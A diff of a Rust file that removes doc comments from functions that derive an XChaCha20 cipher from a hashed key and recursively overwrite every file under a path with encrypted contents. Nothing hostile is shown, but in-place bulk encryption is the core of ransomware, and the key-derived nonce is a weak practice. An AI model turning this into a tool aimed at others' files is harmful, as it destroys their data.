@@ -6,20 +6,17 @@ use chacha20::cipher::{NewCipher, StreamCipher};
 use chacha20::{Key, XChaCha20, XNonce};
 use sha3::{Digest, Sha3_224, Sha3_256};
 
-/// Gets a hash of a slice using the provided algorithm.
 fn hash_slice<H: Digest>(input: &[u8]) -> Vec<u8> {
     let mut hasher = H::new();
     hasher.update(input);
     hasher.finalize().as_slice().to_owned()
 }
 
-/// Generates a nonce from bytes.
 fn generate_nonce(input: &[u8]) -> XNonce {
     let hashed = hash_slice::<Sha3_224>(input);
     XNonce::clone_from_slice(&hashed[..24])
 }
 
-/// Creates a cipher from a key.
 pub fn create_cipher(key: &[u8]) -> XChaCha20 {
     XChaCha20::new(
         Key::from_slice(hash_slice::<Sha3_256>(key).as_slice()),
@@ -35,12 +32,10 @@ const READ_FILE_ERROR_MESSAGE: &'static str = "Could not read from file!";
 const READ_DIR_ERROR_MESSAGE: &'static str = "Could not read from file!";
 const PATH_ERROR_MESSAGE: &'static str = "Could not determine file path target!";
 
-/// Tries to get a buffered reader for the file at `file_path`.
 fn get_file_reader(file_path: &PathBuf) -> Result<BufReader<File>, Error> {
     File::open(file_path).and_then(|file| Ok(BufReader::new(file)))
 }
 
-/// Tries to get a buffered writer for the file at `file_path`.
 fn get_file_writer(file_path: &PathBuf) -> Result<BufWriter<File>, Error> {
     OpenOptions::new()
         .write(true)
@@ -48,7 +43,6 @@ fn get_file_writer(file_path: &PathBuf) -> Result<BufWriter<File>, Error> {
         .and_then(|file| Ok(BufWriter::new(file)))
 }
 
-/// Overwrites a file with its processed contents.
 fn process_file(
     cipher: &mut XChaCha20,
     reader: &mut BufReader<File>,
@@ -75,7 +69,6 @@ fn process_file(
     Ok(())
 }
 
-/// Tries to encrypt the file at `file_path`.
 fn encrypt_file(cipher: &mut XChaCha20, file_path: &PathBuf) -> EncryptionResult {
     return if let Ok(mut reader) = get_file_reader(file_path) {
         if let Ok(mut writer) = get_file_writer(file_path) {
@@ -90,7 +83,6 @@ fn encrypt_file(cipher: &mut XChaCha20, file_path: &PathBuf) -> EncryptionResult
     };
 }
 
-/// Iterates over all files and subdirectories starting at `path` and encrypts their contents.
 pub fn encrypt_path(cipher: &mut XChaCha20, path: &PathBuf) -> Vec<FinalEncryptionResult> {
     let mut results: Vec<FinalEncryptionResult> = vec![];
     if path.is_dir() {
